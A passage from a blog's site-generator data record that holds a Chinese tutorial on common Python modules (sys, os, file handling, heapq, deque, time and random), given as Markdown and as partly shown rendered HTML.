函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效 |\n| %x    | 本地化的日期的表示形式                                       |\n| %X    | 本地化的时间的表示形式                                       |\n| %y    | 年份的缩写，范围：00~99，比如 2018 年就简写成 18             |\n| %Y    | 年份的完整形式。如 2018                                      |\n| %z    | 显示时区偏移                                                 |\n| %Z    | 时区名（如果时区不行在，则显示为空）                         |\n| %%    | 用于代表%符号                                                |\n\n### random 模块\n\n ython中的random模块用于生成随机数。\n\n下面具体介绍random模块的功能：\n\n1.random.random()\n\n \\#用于生成一个0到1的\n\n随机浮点数：0<= n < 1.0\n\n```python\n1 import random  \n2 a = random.random()\n3 print (a)  \n```\n\n2.random.uniform(a,b) \n\n\\#用于生成一个指定范围内的随机符点数，两个参数其中一个是上限，一个是下限。如果a > b，则生成的随机数n: b <= n <= a。如果 a <b， 则 a <= n <= b。\n\n```python\n1 import random  \n2 print(random.uniform(1,10))  \n3 print(random.uniform(10,1)) \n```\n\n3.random.randint(a, b)\n\n \\#用于生成一个指定范围内的整数。其中参数a是下限，参数b是上限，生成的随机数n: a <= n <= b\n\n```python\n1 import random  \n2 print(random.randint(1,10))  \n```\n\n4.random.randrange([start], stop[, step])\n\n \\#从指定范围内，按指定基数递增的集合中 获取一个随机数。\n\nrandom.randrange(10, 30, 2)，结果相当于从[10, 12, 14, 16, ... 26, 28]序列中获取一个随机数。\n\nrandom.randrange(10, 30, 2)在结果上与 random.choice(range(10, 30, 2) 等效。\n\n```python\n1 import random  \n2 print(random.randrange(10,30,2))\n```\n\n 5.random.choice(sequence)\n\n\\#random.choice从序列中获取一个随机元素。其函数原型为：random.choice(sequence)。\n\n参数sequence表示一个有序类型。这里要说明 一下：sequence在python不是一种特定的类型，而是泛指一系列的类型。list, tuple, 字符串都属于sequence。\n\n```python\n1 import random  \n2 lst = ['python','C','C++','javascript']  \n3 str1 = ('I love python')  \n4 print(random.choice(lst))\n5 print(random.choice(str1))  \n```\n\n6.random.shuffle(x[, random])\n\n\\#用于将一个列表中的元素打乱,即将列表内的元素随机排列。\n\n```python\n1 import random\n2 p = ['A' , 'B', 'C', 'D', 'E' ]\n3 random.shuffle(p)  \n4 print (p)  \n```\n\n7.random.sample(sequence, k)\n\n\\#从指定序列中随机获取指定长度的片断并随机排列。注意：sample函数不会修改原有序列。\n\n```python\n1 import random   \n2 lst = [1,2,3,4,5]  \n3 print(random.sample(lst,4))  \n4 print(lst) \n```\n\n\n\n ","source":"_posts/py常用模块.md","raw":"---\ntitle: 每日学说话(●'◡'●)python-常用模块\n---\n\n### sys模块\n\n####  python之sys模块详解\n\nsys模块功能多，我们这里介绍一些比较实用的功能，相信你会喜欢的，和我一起走进python的模块吧！\n\n#### sys模块的常见函数列表\n\n- `sys.argv`: 实现从程序外部向程序传递参数。\n- `sys.exit([arg])`: 程序中间的退出，arg=0为正常退出。\n- `sys.getdefaultencoding()`: 获取系统当前编码，一般默认为ascii。\n- `sys.setdefaultencoding()`: 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，可以先执行reload(sys)，在执行 setdefaultencoding('utf8')，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）\n- `sys.getfilesystemencoding()`: 获取文件系统使用编码方式，Windows下返回'mbcs'，mac下返回'utf-8'.\n- `sys.path`: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。\n- `sys.platform`: 获取当前系统平台。\n- `sys.stdin,sys.stdout,sys.stderr`: stdin , stdout ,  以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的.  你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们\n\n#### sys.argv\n\n功能：在外部向程序内部传递参数\n 示例：`sys.py`\n\n```python\n#!/usr/bin/env python\n\nimport sys\nprint sys.argv[0]\nprint sys.argv[1]\n```\n\n运行：\n\n```python\n# python sys.py argv1\nsys.py\nargv1\n```\n\n自己动手尝试一下，领悟参数对应关系\n\n#### sys.exit(n)\n\n功能：执行到主程序末尾，解释器自动退出，但是如果需要中途退出程序，可以调用sys.exit函数，带有一个可选的整数参数返回给调用它的程序，表示你可以在主程序中捕获对sys.exit的调用。（0是正常退出，其他为异常）\n\n示例：`exit.py`\n\n```python\n#!/usr/bin/env python\n\nimport sys\n\ndef exitfunc(value):\n\tprint value\n\tsys.exit(0)\n\nprint \"hello\"\n\ntry:\n\tsys.exit(1)\nexcept SystemExit,value:\n\texitfunc(value)\n\nprint \"come?\"\n```\n\n运行：\n\n```python\n# python exit.py\nhello\n1\n```\n\n#### sys.path\n\n功能：获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。\n\n示例：\n\n```python\n>>> import sys\n>>> sys.path\n['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/PILcompat', '/usr/lib/python2.7/dist-packages/gtk-2.0', '/usr/lib/python2.7/dist-packages/ubuntu-sso-client']\nsys.path.append(\"自定义模块路径\")\n```\n\n#### sys.modules\n\n功能：`sys.modules`是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，`sys.modules`将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。它拥有字典所拥有的一切方法。\n\n示例：`modules.py`\n\n```python\n#!/usr/bin/env python\n\nimport sys\n\nprint sys.modules.keys()\n\nprint sys.modules.values()\n\nprint sys.modules[\"os\"]\n```\n\n运行：\n\n```python\npython modules.py\n['copy_reg', 'sre_compile', '_sre', 'encodings', 'site', '__builtin__',......\n```\n\n#### sys.stdin\\stdout\\stderr\n\n功能：stdin , stdout , 以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print  不能满足你的要求, 它们就是你所需要的. 你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ),  或者以非标准的方式处理它们\n\n勿忘初心，放得始终 (ง •_•)ง！\n\n### os模块\n\n```python\nimport os\nos.sep:取代操作系统特定的路径分隔符\nos.name:指示你正在使用的工作平台。比如对于Windows，它是'nt'，而对于Linux/Unix用户，它是'posix'。\nos.getcwd:得到当前工作目录，即当前python脚本工作的目录路径。\nos.getenv()和os.putenv:分别用来读取和设置环境变量\nos.listdir():返回指定目录下的所有文件和目录名\nos.remove(file):删除一个文件\nos.stat（file）:获得文件属性\nos.chmod(file):修改文件权限和时间戳\nos.mkdir(name):创建目录\nos.rmdir(name):删除目录\nos.removedirs（r“c：\\python”）:删除多个目录\nos.system():运行shell命令\nos.exit():终止当前进程\nos.linesep:给出当前平台的行终止符。例如，Windows使用'\\r\\n'，Linux使用'\\n'而Mac使用'\\r'\nos.path.split():返回一个路径的目录名和文件名\nos.path.isfile()和os.path.isdir()分别检验给出的路径是一个目录还是文件\nos.path.existe():检验给出的路径是否真的存在\nos.listdir(dirname):列出dirname下的目录和文件\nos.getcwd():获得当前工作目录\nos.curdir:返回当前目录（'.'）\nos.chdir(dirname):改变工作目录到dirname\nos.path.isdir(name):判断name是不是目录，不是目录就返回false\nos.path.isfile(name):判断name这个文件是否存在，不存在返回false\nos.path.exists(name):判断是否存在文件或目录name\nos.path.getsize(name):或得文件大小，如果name是目录返回0L\nos.path.abspath(name):获得绝对路径\nos.path.isabs():判断是否为绝对路径\nos.path.normpath(path):规范path字符串形式\nos.path.split(name):分割文件名与目录（事实上，如果你完全使用目录，它也会将最后一个目录作为文件名而分离，同时它不会判断文件或目录是否存在）\nos.path.splitext():分离文件名和扩展名\nos.path.join(path,name):连接目录与文件名或目录\nos.path.basename(path):返回文件名\nos.path.dirname(path):返回文件路径\n```\n\n文件操作：\n\n```python\nos.mknod(\"text.txt\")：创建空文件\nfp = open(\"text.txt\",w):直接打开一个文件，如果文件不存在就创建文件\n```\n\nopen 模式：\n\n```\nw 写方式\na 追加模式打开（从EOF开始，必要时创建新文件）\nr+ 以读写模式打开\nw+ 以读写模式打开\na+ 以读写模式打开\nrb 以二进制读模式打开\nwb 以二进制写模式打开 (参见 w )\nab 以二进制追加模式打开 (参见 a )\nrb+ 以二进制读写模式打开 (参见 r+ )\nwb+ 以二进制读写模式打开 (参见 w+ )\nab+ 以二进制读写模式打开 (参见 a+ )\n```\n\n```python\nfp.read([size])  #size为读取的长度，以byte为单位\n \nfp.readline([size])  #读一行，如果定义了size，有可能返回的只是一行的一部分\n \nfp.readlines([size])  #把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。\n \nfp.write(str)  #把str写到文件中，write()并不会在str后加上一个换行符\n \nfp.writelines(seq)  #把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写入，不会在每行后面加上任何东西。\n \nfp.close()  #关闭文件。python会在一个文件不用后自动关闭文件，不过这一功能没有保证，最好还是养成自己关闭的习惯。 如果一个文件在关闭后还对其进行操作会产生ValueError\n \nfp.flush()  #把缓冲区的内容写入硬盘\n \nfp.fileno()  #返回一个长整型的”文件标签“\n \nfp.isatty()  #文件是否是一个终端设备文件（unix系统中的）\n \nfp.tell()  #返回文件操作标记的当前位置，以文件的开头为原点\n \nfp.next()  #返回下一行，并将文件操作标记位移到下一行。把一个file用于for … in file这样的语句时，就是调用next()函数来实现遍历的。\n \nfp.seek(offset[,whence])  #将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算的，一般为正数。但如果提供了whence参数就不一定了，whence可以为0表示从头开始计算，1表示以当前位置为原点计算。2表示以文件末尾为原点进行计算。需要注意，如果文件以a或a+的模式打开，每次进行写操作时，文件操作标记会自动返回到文件末尾。\n \nfp.truncate([size])  #把文件裁成规定的大小，默认的是裁到当前文件操作标记的位置。如果size比文件的大小还要大，依据系统的不同可能是不改变文件，也可能是用0把文件补到相应的大小，也可能是以一些随机的内容加上去。\n \n目录操作\n \nos.mkdir(\"file\")　　创建目录\n \nshutil.copyfile(\"oldfile\",\"newfile\")　　复制文件:oldfile和newfile都只能是文件\n \nshutil.copy(\"oldfile\",\"newfile\")  oldfile只能是文件夹，newfile可以是文件，也可以是目标目录\n \nshutil.copytree(\"olddir\",\"newdir\")  复制文件夹.olddir和newdir都只能是目录，且newdir必须不存在\n \nos.rename(\"oldname\",\"newname\")  重命名文件（目录）.文件或目录都是使用这条命令\n \nshutil.move(\"oldpos\",\"newpos\")  移动文件（目录）\n \nos.rmdir(\"dir\")  只能删除空目录\n \nshutil.rmtree(\"dir\")  空目录、有内容的目录都可以删\n \nos.chdir(\"path\")  转换目录，换路径\n```\n\n### 集合、堆和双端队列(heap模块、deque类)\n\n集合(set)、堆(heap)、双端队列(deque)\n\n#### 堆导入 heapq 模块、双端队列导入collections模块。\n\n| 函数                    | 描述                                                         |\n| ----------------------- | ------------------------------------------------------------ |\n| heappush(heap,value)    | 将value加入堆                                                |\n| heappop(heap)           | 将堆中的最小值弹出，并返回该最小值                           |\n| heapify(heap)           | 将列表转换为堆，也就是重新安排列表中元素的顺序               |\n| heapreplace(heap,value) | 将堆中的最小值弹出，并同时将value入堆                        |\n| nlargest(n,iter)        | 返回可迭代对象中前n个最大值，以列表形式返回                  |\n| nsmallest(n,iter)       | 返回可迭代对象中前n个最小值，以列表形式返回                  |\n| merge(*iter,key)        | 合并多个有序的迭代对象，如果指定key，则对每个元素的排序会利用key指定的函数 |\n\n```python\nfrom collections import deque\n```\n\ncollections 是 python 内建的一个集合模块，里面封装了许多集合类，其中队列相关的集合只有一个：deque。\ndeque 是双边队列（double-ended queue），具有队列和栈的性质，在 list 的基础上增加了移动、旋转和增删等。\n\n```python\nd = collections.deque([])\nd.append('a') # 在最右边添加一个元素，此时 d=deque('a')\nd.appendleft('b') # 在最左边添加一个元素，此时 d=deque(['b', 'a'])\nd.extend(['c','d']) # 在最右边添加所有元素，此时 d=deque(['b', 'a', 'c', 'd'])\nd.extendleft(['e','f']) # 在最左边添加所有元素，此时 d=deque(['f', 'e', 'b', 'a', 'c', 'd'])\nd.pop() # 将最右边的元素取出，返回 'd'，此时 d=deque(['f', 'e', 'b', 'a', 'c'])\nd.popleft() # 将最左边的元素取出，返回 'f'，此时 d=deque(['e', 'b', 'a', 'c'])\nd.rotate(-2) # 向左旋转两个位置（正数则向右旋转），此时 d=deque(['a', 'c', 'e', 'b'])\nd.count('a') # 队列中'a'的个数，返回 1\nd.remove('c') # 从队列中将'c'删除，此时 d=deque(['a', 'e', 'b'])\nd.reverse() # 将队列倒序，此时 d=deque(['b', 'e', 'a'])\n```\n\n使用deque解决约瑟夫问题：\n\n```python\n\"\"\" 约瑟夫算法\n据说著名犹太历史学家 Josephus 有过以下的故事：\n在罗马人占领桥塔帕特后，39个犹太人与 Josephus 及他的朋友躲到一个洞中，\n39个犹太人决定宁愿死也不要被敌人抓到，于是决定了一个自杀方式，41个人排成一个圆圈，\n由第1个人开始报数，每报数到第3人该人就必须自杀，然后再由下一个重新报数，\n直到所有人都自杀身亡为止。然而 Josephus 和他的朋友并不想自杀，\n问他俩安排的哪两个位置可以逃过这场死亡游戏？\n\"\"\"\nimport collections\ndef ysf(a, b):\n    d = collections.deque(range(1, a+1)) # 将每个人依次编号，放入到队列中\n    while d:\n        d.rotate(-b) # 队列向左旋转b步\n        print(d.pop()) # 将最右边的删除，即自杀的人\n\nif __name__ == '__main__':\n    ysf(41,3) # 输出的是自杀的顺序。最后两个是16和31，说明这两个位置可以保证他俩的安全。\n```\n\n###  time模块\n\ntime 模块主要包含各种提供日期、时间功能的类和函数。该模块既提供了把日期、时间格式化为字符串的功能，也提供了从字符串恢复日期、时间的功能。\n\n在 Python 的交互式解释器中先导入 time 模块，然后输入 [e for e in dir(time) if not e.startswith('_')] 命令，即可看到该模块所包含的全部属性和函数：\n\n```python\n>>> [e for e in dir(time) if not e.startswith('_')]\n['altzone', 'asctime', 'clock', 'ctime', 'daylight', 'get_clock_info', 'gmtime', 'localtime', 'mktime', \n'monotonic',\n 'perf_counter', 'process_time', 'sleep', 'strftime', 'strptime', 'struct_time', 'time', 'timezone', 'tzname']\n```\n\n在 time 模块内提供了一个 time.struct_time 类，该类代表一个时间对象，它主要包含 9 个属性，每个属性的信息如下表所示：\n\n| 字段名   | 字段含义     | 值                      |\n| -------- | ------------ | ----------------------- |\n| tm_year  | 年           | 如 2017、2018 等        |\n| tm_mon   | 月           | 如 2、3 等，范围为 1~12 |\n| tm_mday  | 日           | 如 2、3 等，范围为 1~31 |\n| tm_hour  | 时           | 如 2、3 等，范围为 0~23 |\n| tm_min   | 分           | 如 2、3 等，范围为 0~59 |\n| tm_sec   | 秒           | 如 2、3 等，范围为 0~59 |\n| tm_wday  | 周           | 周一为 0，范围为 0~6    |\n| tm_yday  | 一年内第几天 | 如 65，范围 1~366       |\n| tm_isdst | 夏时令       | 0、1 或 -1              |\n\n比如，Python 可以用 time.struct_time(tm_year=2018, tm_mon=5, tm_mday=2, tm_hour=8,  tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, tm_isdst=0) 很清晰地代表时间。\n\n此外，Python 还可以用一个包含 9 个元素的元组来代表时间，该元组的 9 个元素和 struct_time 对象中 9 个属性的含义是一一对应的。比如程序可以使用（2018, 5, 2, 8, 0, 30, 3, 1, 0）来代表时间。\n\n在日期、时间模块内常用的功能函数如下：\n\ntime.asctime([t])：将时间元组或 struct_time 转换为时间字符串。如果不指定参数 t，则默认转换当前时间。\n\ntime.ctime([secs])：将以秒数代表的时间转换为时间宇符串。\n\ntime.gmtime([secs])：将以秒数代表的时间转换为 struct_time 对象。如果不传入参数，则使用当前时间。\n\ntime.localtime([secs])：将以秒数代表的时间转换为代表当前时间的 struct_time 对象。如果不传入参数，则使用当前时间。\n\ntime.mktime(t)：它是 localtime 的反转函数，用于将 struct_time 对象或元组代表的时间转换为从 1970 年 1 月 1 日 0 点整到现在过了多少秒。\n\ntime.perf_counter()：返回性能计数器的值。以秒为单位。\n\ntime.process_time()：返回当前进程使用 CPU 的时间。以秒为单位。\n\ntime.sleep(secs)：暂停 secs 秒，什么都不干。\n\ntime.strftime(format[, t])：将时间元组或 struct_time 对象格式化为指定格式的时间字符串。如果不指定参数 t，则默认转换当前时间。\n\ntime.strptime(string[, format])：将字符串格式的时间解析成 struct_time 对象。\n\ntime.time()：返回从 1970 年 1 月 1 日 0 点整到现在过了多少秒。\n\ntime.timezone：返回本地时区的时间偏移，以秒为单位。\n\ntime.tzname：返回本地时区的名字。\n\n下面程序示范了 time 棋块的功能函数：\n\n```python\nimport time\n# 将当前时间转换为时间字符串\nprint(time.asctime())\n# 将指定时间转换时间字符串，时间元组的后面3个元素没有设置\nprint(time.asctime((2018, 2, 4, 11, 8, 23, 0, 0 ,0))) # Mon Feb  4 11:08:23 2018\n# 将以秒数为代表的时间转换为时间字符串\nprint(time.ctime(30)) # Thu Jan  1 08:00:30 1970\n# 将以秒数为代表的时间转换为struct_time对象。\nprint(time.gmtime(30))\n# 将当前时间转换为struct_time对象。\nprint(time.gmtime())\n# 将以秒数为代表的时间转换为代表当前时间的struct_time对象\nprint(time.localtime(30))\n# 将元组格式的时间转换为秒数代表的时间\nprint(time.mktime((2018, 2, 4, 11, 8, 23, 0, 0 ,0))) # 1517713703.0\n# 返回性能计数器的值\nprint(time.perf_counter())\n# 返回当前进程使用CPU的时间\nprint(time.process_time())\n#time.sleep(10)\n# 将当前时间转换为指定格式的字符串\nprint(time.strftime('%Y-%m-%d %H:%M:%S'))\nst = '2018年3月20日'\n# 将指定时间字符串恢复成struct_time对象。\nprint(time.strptime(st, '%Y年%m月%d日'))\n# 返回从1970年1970年1月1日0点整到现在过了多少秒。\nprint(time.time())\n# 返回本地时区的时间偏移，以秒为单位\nprint(time.timezone) # 在国内东八区输出-28800\n```\n\n运行上面程序，可以看到如下输出结果：\n\n```python\nFri Feb 22 11:28:39 2019\nMon Feb  4 11:08:23 2018\nThu Jan  1 08:00:30 1970\ntime.struct_time(tm_year=1970, tm_mon=1, tm_mday=1, tm_hour=0, tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, \ntm_isdst=0)\ntime.struct_time(tm_year=2019, tm_mon=2, tm_mday=22, tm_hour=3, tm_min=28, tm_sec=39, tm_wday=4, tm_yday=53, \ntm_isdst=0)\ntime.struct_time(tm_year=1970, tm_mon=1, tm_mday=1, tm_hour=8, tm_min=0, tm_sec=30, tm_wday=3, tm_yday=1, \ntm_isdst=0)\n1517713703.0\n0.0\n0.140625\n2019-02-22 11:28:39\ntime.struct_time(tm_year=2018, tm_mon=3, tm_mday=20, tm_hour=0, tm_min=0, tm_sec=0, tm_wday=1, tm_yday=79, \ntm_isdst=-1)\n1550806119.4960592\n-28800\n```\n\ntime 模块中的 strftime() 和 strptime() 两个函数互为逆函数，其中 strftime() 用于将 struct_time 对象或时间元组转换为时间字符串；而 strptime() 函数用于将时间字符串转换为 struct_time  对象。这两个函数都涉及编写格式模板，比如上面程序中使用 %Y 代表年、%m 代表月、%d 代表日、%H 代表时、%M 代表分、%S  代表秒。这两个函数所需要的时间格式字符串支持的指令如下表所示：\n\n| 指 令 | 含义                                                         |\n| ----- | ------------------------------------------------------------ |\n| %a    | 本地化的星期几的缩写名，比如 Sun 代表星期天                  |\n| %A    | 本地化的星期几的完整名                                       |\n| %b    | 本地化的月份的缩写名，比如 Jan 代表一月                      |\n| %B    | 本地化的月份的完整名                                         |\n| %c    | 本地化的日期和时间的表示形式                                 |\n| %d    | 代表一个月中第几天的数值，范固： 01~31                       |\n| %H    | 代表 24 小时制的小时，范围：00~23                            |\n| %I    | 代表 12 小时制的小时，范围：01~12                            |\n| %j    | 一年中第几天，范围：001~366                                  |\n| %m    | 代表月份的数值，范围：01~12                                  |\n| %M    | 代表分钟的数值，范围：00~59                                  |\n| %p    | 上午或下午的本地化方式。当使用 strptime() 函数并使用 %I 指令解析小时时，%p 只影响小时字段 |\n| %S    | 代表分钟的数值，范围：00~61。该范围确实是 00~61，60 在表示闰秒的时间戳时有效，而 61 则是由于一些历史原因造成的 |\n| %U    | 代表一年中表示第几周，以星期天为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期天被认为处于第一周。当使用 strptime() 函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效 |\n| %w    | 代表星期几的数值，范围：0~6，其中 0 代表周日                 |\n| %W    | 代表一年小第几周，以星期一为每周的第一天，范围：00~53。在这种方式下，一年中第一个星期一被认为处于第一周。当使用 strptime() 函数解析时间字符串时，只有同时指定了星期几和年份该指令才会有效 |\n| %x    | 本地化的日期的表示形式                                       |\n| %X    | 本地化的时间的表示形式                                       |\n| %y    | 年份的缩写，范围：00~99，比如 2018 年就简写成 18             |\n| %Y    | 年份的完整形式。如 2018                                      |\n| %z    | 显示时区偏移                                                 |\n| %Z    | 时区名（如果时区不行在，则显示为空）                         |\n| %%    | 用于代表%符号                                                |\n\n### random 模块\n\n ython中的random模块用于生成随机数。\n\n下面具体介绍random模块的功能：\n\n1.random.random()\n\n \\#用于生成一个0到1的\n\n随机浮点数：0<= n < 1.0\n\n```python\n1 import random  \n2 a = random.random()\n3 print (a)  \n```\n\n2.random.uniform(a,b) \n\n\\#用于生成一个指定范围内的随机符点数，两个参数其中一个是上限，一个是下限。如果a > b，则生成的随机数n: b <= n <= a。如果 a <b， 则 a <= n <= b。\n\n```python\n1 import random  \n2 print(random.uniform(1,10))  \n3 print(random.uniform(10,1)) \n```\n\n3.random.randint(a, b)\n\n \\#用于生成一个指定范围内的整数。其中参数a是下限，参数b是上限，生成的随机数n: a <= n <= b\n\n```python\n1 import random  \n2 print(random.randint(1,10))  \n```\n\n4.random.randrange([start], stop[, step])\n\n \\#从指定范围内，按指定基数递增的集合中 获取一个随机数。\n\nrandom.randrange(10, 30, 2)，结果相当于从[10, 12, 14, 16, ... 26, 28]序列中获取一个随机数。\n\nrandom.randrange(10, 30, 2)在结果上与 random.choice(range(10, 30, 2) 等效。\n\n```python\n1 import random  \n2 print(random.randrange(10,30,2))\n```\n\n 5.random.choice(sequence)\n\n\\#random.choice从序列中获取一个随机元素。其函数原型为：random.choice(sequence)。\n\n参数sequence表示一个有序类型。这里要说明 一下：sequence在python不是一种特定的类型，而是泛指一系列的类型。list, tuple, 字符串都属于sequence。\n\n```python\n1 import random  \n2 lst = ['python','C','C++','javascript']  \n3 str1 = ('I love python')  \n4 print(random.choice(lst))\n5 print(random.choice(str1))  \n```\n\n6.random.shuffle(x[, random])\n\n\\#用于将一个列表中的元素打乱,即将列表内的元素随机排列。\n\n```python\n1 import random\n2 p = ['A' , 'B', 'C', 'D', 'E' ]\n3 random.shuffle(p)  \n4 print (p)  \n```\n\n7.random.sample(sequence, k)\n\n\\#从指定序列中随机获取指定长度的片断并随机排列。注意：sample函数不会修改原有序列。\n\n```python\n1 import random   \n2 lst = [1,2,3,4,5]  \n3 print(random.sample(lst,4))  \n4 print(lst) \n```\n\n\n\n ","slug":"py常用模块","published":1,"date":"2021-06-24T09:10:37.676Z","updated":"2021-06-24T12:21:02.613Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9v000arouv3cbp8c90","content":"<h3 id=\"sys模块\"><a href=\"#sys模块\" class=\"headerlink\" title=\"sys模块\"></a>sys模块</h3><h4 id=\"python之sys模块详解\"><a href=\"#python之sys模块详解\" class=\"headerlink\" title=\"python之sys模块详解\"></a>python之sys模块详解</h4><p>sys模块功能多，我们这里介绍一些比较实用的功能，相信你会喜欢的，和我一起走进python的模块吧！</p>\n<h4 id=\"sys模块的常见函数列表\"><a href=\"#sys模块的常见函数列表\" class=\"headerlink\" title=\"sys模块的常见函数列表\"></a>sys模块的常见函数列表</h4><ul>\n<li><code>sys.argv</code>: 实现从程序外部向程序传递参数。</li>\n<li><code>sys.exit([arg])</code>: 程序中间的退出，arg=0为正常退出。</li>\n<li><code>sys.getdefaultencoding()</code>: 获取系统当前编码，一般默认为ascii。</li>\n<li><code>sys.setdefaultencoding()</code>: 设置系统默认编码，执行dir（sys）时不会看到这个方法，在解释器中执行不通过，可以先执行reload(sys)，在执行 setdefaultencoding(‘utf8’)，此时将系统默认编码设置为utf8。（见设置系统默认编码 ）</li>\n<li><code>sys.getfilesystemencoding()</code>: 获取文件系统使用编码方式，Windows下返回’mbcs’，mac下返回’utf-8’.</li>\n<li><code>sys.path</code>: 获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</li>\n<li><code>sys.platform</code>: 获取当前系统平台。</li>\n<li><code>sys.stdin,sys.stdout,sys.stderr</code>: stdin , stdout ,  以及stderr 变量包含与标准I/O 流对应的流对象. 如果需要更好地控制输出,而print 不能满足你的要求, 它们就是你所需要的.  你也可以替换它们, 这时候你就可以重定向输出和输入到其它设备( device ), 或者以非标准的方式处理它们</li>\n</ul>\n<h4 id=\"sys-argv\"><a href=\"#sys-argv\" class=\"headerlink\" title=\"sys.argv\"></a>sys.argv</h4><p>功能：在外部向程序内部传递参数<br> 示例：<code>sys.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span> sys.argv[<span class=\"number\">1</span>]</span><br></pre></td></tr></table></figure>\n\n<p>运行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python sys.py argv1</span></span><br><span class=\"line\">sys.py</span><br><span class=\"line\">argv1</span><br></pre></td></tr></table></figure>\n\n<p>自己动手尝试一下，领悟参数对应关系</p>\n<h4 id=\"sys-exit-n\"><a href=\"#sys-exit-n\" class=\"headerlink\" title=\"sys.exit(n)\"></a>sys.exit(n)</h4><p>功能：执行到主程序末尾，解释器自动退出，但是如果需要中途退出程序，可以调用sys.exit函数，带有一个可选的整数参数返回给调用它的程序，表示你可以在主程序中捕获对sys.exit的调用。（0是正常退出，其他为异常）</p>\n<p>示例：<code>exit.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">exitfunc</span>(<span class=\"params\">value</span>):</span></span><br><span class=\"line\">\t<span class=\"built_in\">print</span> value</span><br><span class=\"line\">\tsys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;hello&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">\tsys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"><span class=\"keyword\">except</span> SystemExit,value:</span><br><span class=\"line\">\texitfunc(value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;come?&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>运行：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># python exit.py</span></span><br><span class=\"line\">hello</span><br><span class=\"line\"><span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"sys-path\"><a href=\"#sys-path\" class=\"headerlink\" title=\"sys.path\"></a>sys.path</h4><p>功能：获取指定模块搜索路径的字符串集合，可以将写好的模块放在得到的某个路径下，就可以在程序中import时正确找到。</p>\n<p>示例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>sys.path</span><br><span class=\"line\">[<span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/plat-x86_64-linux-gnu&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/lib-tk&#x27;</span>, <span class=\"string\">&#x27;/usr/lib/python2.7/lib-old&#x27;</span>, <span 